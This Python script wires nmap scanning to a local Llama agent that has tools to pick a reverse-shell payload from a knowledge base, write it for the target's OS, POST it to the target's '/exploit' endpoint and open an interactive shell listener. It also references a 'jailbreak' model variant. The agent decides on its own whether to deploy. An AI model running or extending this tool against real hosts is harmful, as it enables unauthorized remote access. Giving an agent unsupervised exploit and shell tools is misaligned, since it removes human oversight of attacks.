#!/usr/bin/env python3
"""
Modified nmap_to_llama.py with RAG integration and tool calling support.
- Validate IP input
- Run nmap (XML output)
- Parse important fields (open ports, services, versions, host info)
- Set up RAG on reverse_shells.json
- Send a concise prompt to local Ollama (Llama 3.1) with tool calling for analysis
- Supports agentic loop for tool selection (e.g., query KB)
- Added tools for payload generation, deployment, and reverse shell listening.
"""

#chat transcript used: https://chatgpt.com/share/69041cad-5b04-8013-81df-2438c29ed0ca

import subprocess
import xml.etree.ElementTree as ET
import ipaddress
import requests
import textwrap
import sys
import shutil
import json
import os
import socket
import threading
import time
import re

OLLAMA_URL = "http://localhost:11434/v1/chat/completions"  # OpenAI-style endpoint Ollama supports
MODEL = "llama3.1:latest"  # change if needed; ensure model supports tool calling
#MODEL = "llama31-8b-jailbreak"
NMAP_ARGS = ["-sV", "-O", "-Pn", "-oX", "-"]  # service/version detection, OS, no ping, output XML to stdout

# Load reverse_shells.json for RAG (assume it's in the same directory)
REVERSE_SHELLS_FILE = "reverse_shells.json"
with open(REVERSE_SHELLS_FILE, "r") as f:
    reverse_shells = json.load(f)

# Setup RAG
embedder = SentenceTransformer("all-MiniLM-L6-v2")
client = chromadb.Client()
collection_name = "reverse_shells_kb"
if collection_name in [c.name for c in client.list_collections()]:
    client.delete_collection(collection_name)
collection = client.create_collection(name=collection_name)

# Add documents to collection (chunk payloads)
documents = []
ids = []
metadatas = []
for idx, section in enumerate(reverse_shells["sections"]):
    doc = section["payload_info"]["example"]
    embedding = embedder.encode(doc).tolist()
    documents.append(doc)
    ids.append(str(idx))
    metadatas.append({"os": section["OS"]})
collection.add(
    documents=documents,
    embeddings=[embedder.encode(doc).tolist() for doc in documents],
    ids=ids,
    metadatas=metadatas
)

def query_kb(query: str, top_k: int = 3) -> str:
    """Query the knowledge base for relevant payloads."""
    results = collection.query(
        query_embeddings=embedder.encode(query).tolist(),
        n_results=top_k
    )
    relevant = []
    for i in range(top_k):
        if results["documents"] and i < len(results["documents"][0]):
            doc = results["documents"][0][i]
            meta = results["metadatas"][0][i]
            relevant.append(f"OS: {meta['os']}, Payload: {doc}")
    return "\n".join(relevant) if relevant else "No relevant payloads found."

def get_local_ip(user_os):
    """Get local IP based on user's OS."""
    if user_os == "MacOS":
        try:
            route_output = subprocess.check_output(["route", "get", "1.1.1.1"]).decode('utf-8')
            iface = None
            for line in route_output.splitlines():
                if "interface:" in line:
                    iface = line.split(":")[1].strip()
                    break
            if not iface:
                raise ValueError("Could not find network interface")
            ip = subprocess.check_output(["ipconfig", "getifaddr", iface]).decode('utf-8').strip()
            return ip
        except Exception as e:
            raise RuntimeError(f"Error getting IP on MacOS: {e}")
    elif user_os == "Linux":
        try:
            output = subprocess.check_output(["ip", "route", "get", "1.1.1.1"]).decode('utf-8')
            ip_match = re.search(r'src (\S+)', output)
            if ip_match:
                return ip_match.group(1)
            raise ValueError("Could not find source IP")
        except Exception as e:
            raise RuntimeError(f"Error getting IP on Linux: {e}")
    elif user_os == "Windows":
        try:
            output = subprocess.check_output("ipconfig", shell=True).decode('utf-8')
            ip_match = re.search(r'IPv4 Address.*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', output)
            if ip_match:
                return ip_match.group(1)
            raise ValueError("Could not find IPv4 address")
        except Exception as e:
            raise RuntimeError(f"Error getting IP on Windows: {e}")
    else:
        raise ValueError("Unsupported OS")

def generate_payload(os_type, listener_ip, listener_port):
    """Generate and write reverse shell payload based on OS type."""
    selected_section = None
    os_name = os_type.lower()
    if 'linux' in os_name or 'unix' in os_name:
        selected_section = next((s for s in reverse_shells['sections'] if 'Bash' in s['OS']), None)
    elif 'windows' in os_name:
        selected_section = next((s for s in reverse_shells['sections'] if 'PowerShell' in s['OS'] or 'C Windows' in s['OS']), None)
    if not selected_section:
        return "No matching payload found for OS."
    payload_template = selected_section['payload_info']['payload_template']
    payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
    with open('current_payload.txt', 'w') as f:
        f.write(payload)
    return f"Payload generated and written to current_payload.txt: {payload}"

def deploy_payload(target_ip, target_port, endpoint='/exploit', payload_file='current_payload.txt'):
    """Deploy payload via POST to target."""
    try:
        with open(payload_file, 'r') as f:
            payload = f.read().strip()
        url = f"http://{target_ip}:{target_port}{endpoint}"
        data = {'payload': payload}
        response = requests.post(url, data=data, timeout=10)
        return f"Deployment response: Status {response.status_code}, Content: {response.text[:200]}..."
    except Exception as e:
        return f"Deployment error: {str(e)}"

def start_listener(listener_port, timeout=60):
    """Start reverse shell listener and hand off interactively."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', listener_port))
    server.listen(1)
    server.settimeout(timeout)
    try:
        conn, addr = server.accept()
        print(f"Connection from {addr}. Enter commands (type 'exit' to quit).")
        def interact():
            while True:
                try:
                    cmd = input("shell> ")
                    if cmd.lower() == 'exit':
                        break
                    conn.send((cmd + '\n').encode())
                    response = conn.recv(4096).decode(errors='ignore')
                    print(response)
                except Exception:
                    break
        interact_thread = threading.Thread(target=interact)
        interact_thread.start()
        interact_thread.join()  # Wait for user to exit
    except socket.timeout:
        return "Timeout: No connection received."
    except Exception as e:
        return f"Listener error: {str(e)}"
    finally:
        server.close()
    return "Listener session ended."

# Define tools (you can add more here)
TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "query_kb",
            "description": "Query the reverse shells knowledge base for relevant payload examples based on OS or service.",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {"type": "string", "description": "The search query (e.g., 'bash reverse shell')."},
                    "top_k": {"type": "integer", "description": "Number of results (default 3)."}
                },
                "required": ["query"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "get_attacker_ip",
            "description": "Get the attacker's local IP address.",
            "parameters": {
                "type": "object",
                "properties": {},
                "required": []
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "generate_payload",
            "description": "Generate and write a reverse shell payload to 'current_payload.txt'.",
            "parameters": {
                "type": "object",
                "properties": {
                    "os_type": {"type": "string", "description": "Target OS type (e.g., Linux, Windows)."},
                    "listener_ip": {"type": "string", "description": "Listener IP address."},
                    "listener_port": {"type": "integer", "description": "Listener port."}
                },
                "required": ["os_type", "listener_ip", "listener_port"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "deploy_payload",
            "description": "Deploy the payload via POST to the target.",
            "parameters": {
                "type": "object",
                "properties": {
                    "target_ip": {"type": "string", "description": "Target IP address."},
                    "target_port": {"type": "integer", "description": "Target port for deployment."},
                    "endpoint": {"type": "string", "description": "Endpoint path (default '/exploit')."}
                },
                "required": ["target_ip", "target_port"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "start_listener",
            "description": "Start a reverse shell listener and hand off interactively.",
            "parameters": {
                "type": "object",
                "properties": {
                    "listener_port": {"type": "integer", "description": "Port to listen on."}
                },
                "required": ["listener_port"]
            }
        }
    }
]

def validate_ip(ip_str: str) -> str:
    """Validate IPv4 or IPv6; raise ValueError if invalid."""
    try:
        ip = ipaddress.ip_address(ip_str.strip())
        return str(ip)
    except ValueError:
        raise ValueError(f"Invalid IP address: {ip_str}")

def check_prereqs():
    """Ensure nmap is available."""
    if not shutil.which("nmap"):
        raise EnvironmentError("nmap not found in PATH. Please install nmap and retry.")

def run_nmap(ip: str, extra_args=None, timeout=120) -> str:
    """Run nmap and return XML output as string."""
    if extra_args is None:
        extra_args = []
    cmd = ["sudo", "nmap"] + NMAP_ARGS + extra_args + [ip]
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    if proc.returncode != 0 and not proc.stdout:
        raise RuntimeError(f"nmap error (code {proc.returncode}):\n{proc.stderr.strip()}")
    return proc.stdout

def parse_nmap_xml(xml_text: str) -> dict:
    """
    Parse nmap XML and extract a concise summary.
    Returns dict with host_info and ports list.
    """
    root = ET.fromstring(xml_text)
    host = root.find("host")
    if host is None:
        return {"hostnames": [], "addresses": [], "ports": [], "os": None, "raw_host_state": None}

    addresses = []
    for addr in host.findall("address"):
        addr_type = addr.get("addrtype")
        addresses.append({"addr": addr.get("addr"), "type": addr_type})

    hostnames = []
    hn = host.find("hostnames")
    if hn is not None:
        for name in hn.findall("hostname"):
            hostnames.append({"name": name.get("name"), "type": name.get("type")})

    status = host.find("status")
    host_state = status.get("state") if status is not None else None

    ports = []
    ports_node = host.find("ports")
    if ports_node is not None:
        for p in ports_node.findall("port"):
            portid = p.get("portid")
            proto = p.get("protocol")
            state_node = p.find("state")
            state = state_node.get("state") if state_node is not None else None
            service_node = p.find("service")
            service = {}
            if service_node is not None:
                service = {
                    "name": service_node.get("name"),
                    "product": service_node.get("product"),
                    "version": service_node.get("version"),
                    "extrainfo": service_node.get("extrainfo"),
                    "conf": service_node.get("conf"),
                }
            ports.append({"port": int(portid), "proto": proto, "state": state, "service": service})

    os_node = host.find("os")
    os_guess = None
    if os_node is not None:
        osmatch = os_node.find("osmatch")
        if osmatch is not None:
            os_guess = {"name": osmatch.get("name"), "accuracy": osmatch.get("accuracy")}

    return {
        "host_state": host_state,
        "addresses": addresses,
        "hostnames": hostnames,
        "ports": ports,
        "os_guess": os_guess,
    }

def build_prompt(summary: dict, raw_xml: str = None, max_chars=3000) -> str:
    """
    Build a prompt to send to Llama for analysis.
    We include a concise summary and optionally the (truncated) raw XML for deeper parsing.
    """
    header = "You are a cybersecurity analyst. Examine the nmap scan results for potential issues and next steps.\n"
    host_info = []
    for a in summary["addresses"]:
        host_info.append(f"- {a['type']}: {a['addr']}")
    if summary["hostnames"]:
        host_info.append("- hostnames: " + ", ".join(h["name"] for h in summary["hostnames"]))
    if summary["os_guess"]:
        host_info.append(f"- OS guess: {summary['os_guess']['name']} (accuracy {summary['os_guess']['accuracy']})")
    host_info.append(f"- Host state: {summary.get('host_state')}")
    host_block = "Host info:\n" + "\n".join(host_info)

    ports_block_lines = []
    for p in sorted(summary["ports"], key=lambda x: x["port"]):
        svc = p["service"]
        svc_desc = svc.get("name") if svc else None
        prod_ver = ""
        if svc and svc.get("product"):
            prod_ver = f" ({svc.get('product')}{' ' + svc.get('version') if svc.get('version') else ''})"
        ports_block_lines.append(f" - {p['port']}/{p['proto']} {p['state']}: {svc_desc or ''}{prod_ver}")

    ports_block = "Open/filtered ports and services:\n" + ("\n".join(ports_block_lines) if ports_block_lines else " - none found")

    prompt = textwrap.dedent(
        f"""{header}
{host_block}

{ports_block}

You have access to tools, including querying a knowledge base of reverse shell payloads, getting attacker IP, generating payloads, deploying them, and starting a listener.
Use tools if needed to suggest conceptual next steps or demonstrate.

Please:
1) Give a short (3-6 bullet) prioritized list of security implications for the services found.
2) Suggest immediate next steps (tools/commands/config changes) to investigate or mitigate (be practical). Use tools for payload ideas, generation, deployment if relevant for demonstration.
3) Indicate any false positives or caveats you think might be present based only on nmap output.

Be concise and avoid full exploit instructions.

"""
    )

    if raw_xml:
        raw_to_attach = raw_xml.strip()
        if len(raw_to_attach) > max_chars:
            raw_to_attach = raw_to_attach[: max_chars] + "\n...[truncated]"
        prompt += "\n\nAdditional raw nmap output (truncated):\n" + raw_to_attach

    return prompt

def execute_tool(tool_call, user_os):
    """Execute the tool based on the call."""
    function_name = tool_call["name"]
    args = tool_call["arguments"]
    if function_name == "query_kb":
        query = args.get("query", "")
        top_k = args.get("top_k", 3)
        return query_kb(query, top_k)
    elif function_name == "get_attacker_ip":
        try:
            ip = get_local_ip(user_os)
            return f"Attacker IP: {ip}"
        except Exception as e:
            return str(e)
    elif function_name == "generate_payload":
        os_type = args.get("os_type")
        listener_ip = args.get("listener_ip")
        listener_port = args.get("listener_port")
        if not all([os_type, listener_ip, listener_port]):
            return "Missing required arguments."
        return generate_payload(os_type, listener_ip, listener_port)
    elif function_name == "deploy_payload":
        target_ip = args.get("target_ip")
        target_port = args.get("target_port")
        endpoint = args.get("endpoint", "/exploit")
        if not all([target_ip, target_port]):
            return "Missing required arguments."
        return deploy_payload(target_ip, target_port, endpoint)
    elif function_name == "start_listener":
        listener_port = args.get("listener_port")
        if not listener_port:
            return "Missing listener_port."
        return start_listener(listener_port)
    return "Tool not found."

def ask_llama_with_tools(prompt: str, user_os) -> str:
    """Send prompt to Ollama with tools and handle agentic loop."""
    messages = [
        {"role": "system", "content": "You are an expert cybersecurity analyst. You have tools: query_kb for reverse shells KB, get_attacker_ip to get your IP, generate_payload to create and write payload, deploy_payload to send it to target, start_listener to open reverse shell listener. Use tools when appropriate."},
        {"role": "user", "content": prompt},
    ]
    analysis = ""
    max_iterations = 5  # Prevent infinite loops

    for _ in range(max_iterations):
        payload = {
            "model": MODEL,
            "messages": messages,
            "tools": TOOLS,
            "max_tokens": 800,
            "temperature": 0.2,
        }
        resp = requests.post(OLLAMA_URL, json=payload, timeout=60)
        resp.raise_for_status()
        data = resp.json()
        response = data["choices"][0]["message"]

        if "tool_calls" in response:
            tool_calls = response["tool_calls"]
            messages.append(response)  # Add assistant's message
            for tool_call in tool_calls:
                tool_result = execute_tool(tool_call["function"], user_os)
                messages.append({
                    "role": "tool",
                    "content": tool_result,
                    "name": tool_call["function"]["name"]
                })
        else:
            analysis = response["content"]
            break

    return analysis

def main():
    user_os = input("Is your OS Windows, Linux, or MacOS? ").strip().capitalize()
    if user_os not in ["Windows", "Linux", "MacOS"]:
        print("Unsupported OS. Exiting.")
        sys.exit(1)

    check_prereqs()
    if len(sys.argv) >= 2:
        ip_in = sys.argv[1]
    else:
        ip_in = input("Enter target IP (IPv4/IPv6): ").strip()

    try:
        ip = validate_ip(ip_in)
    except ValueError as e:
        print(f"Error: {e}")
        sys.exit(1)

    print(f"Running nmap against {ip} ... (this can take a while)")
    try:
        xml = run_nmap(ip)
    except Exception as e:
        print("nmap failed:", e)
        sys.exit(1)

    summary = parse_nmap_xml(xml)
    prompt = build_prompt(summary, raw_xml=xml, max_chars=2000)

    print("Asking Llama to analyze results with tools...")
    try:
        analysis = ask_llama_with_tools(prompt, user_os)
    except Exception as e:
        print("Failed to query Llama:", e)
        sys.exit(1)

    print("\n=== Llama Analysis ===\n")
    print(analysis)
    print("\n=== End ===\n")

if __name__ == "__main__":
    main()